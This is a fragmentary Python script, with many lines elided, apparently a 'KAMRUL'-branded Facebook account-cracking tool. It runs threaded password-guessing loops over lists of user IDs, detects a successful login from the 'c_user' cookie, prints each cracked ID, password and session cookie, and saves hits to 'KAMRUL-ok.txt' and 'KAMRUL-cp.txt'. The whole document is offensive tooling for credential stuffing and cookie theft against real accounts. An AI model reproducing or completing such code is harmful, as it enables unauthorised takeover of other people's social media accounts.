...
def num():
    ...
    with ThreadPool(max_workers=30) as yaari:
        ...
        print("\033[38;5;46m■■■■■♤KAMRUL♤■■■■■■     \033[38;5;46m  └━━━━━━━━━━━━━━━━┘\n")
        print(f" \033[38;5;46m•••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••")
        for guru in user:
    ...
    print(' [+] Ids saved in KAMRUL-ok.txt,KAMRUL-cp.txt')
...
def gml():
    ...
    os.system('clear')
    os.system('xdg-https://facebook.com/groups/647565727215997/')
    print(logo)
    ...
    with ThreadPool(max_workers=30) as yaari:
        ...
        print(logo)
        tl = str(len(user))
        print(' \033[38;5;46m[+] KAMRUL{{{𝙄𝘿𝙎}}}:\033[38;5;46m '+tl)
        print(f" \033[38;5;46m❥❥❥❥❥❥❥❥❥❥❥❥❥❥❥❥❥❥❥❥❥❥❥❥❥❥❥❥❥❥❥❥❥❥❥❥❥❥❥❥❥❥❥")
        print("\033[38;5;46m┌━━━━━━━━━━━━━━━┐        \033[38;5;46m┌━━━━━━━━━━━━━━━━┐")
    ...
    print(' [+] \033[38;5;46mIds saved in KAMRUL-ok.txt,KAMRUL-cp.txt')
def rcrack1(uid,pwx,tl):
    ...
    try:
        for ps in pwx:
            ...
            sys.stdout.write('\r[\033[1;92m[\033[38;5;46mKAMRUL]\033[1;97m] > [%s/%s] > [OK\033[1;97m:-\033[1;92m%s\033[1;97m] - [CP\033[1;97m:-\033[1;91m%s\033[1;97m] \r'%(loop,tl,len(oks),len(cps))),
            sys.stdout.flush()
            ...
            if 'c_user' in log_cookies:
                ...
                cid = coki[7:22]
                print(f"\033[38;5;46m[KAMRUL-OK🐼] {uid} | {ps}")
                print(f" Cookie : {coki}")
                ...
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[82:97]
                #print(f"\x1b[38;5;196m[KAMRUL-CP🍾] {uid}|{ps}")
                ...
                continue
        loop+=1
        sys.stdout.write(f'\r\033[38;5;46m[KAMRUL] \033[38;5;46m%s\033[38;5;46m |\033[m[\033[38;5;46mOK:\033[\033[38;5;46m%s\033[38;5;46m] '%(loop,len(oks))),
        sys.stdout.flush()
    except:
        pass
Main()
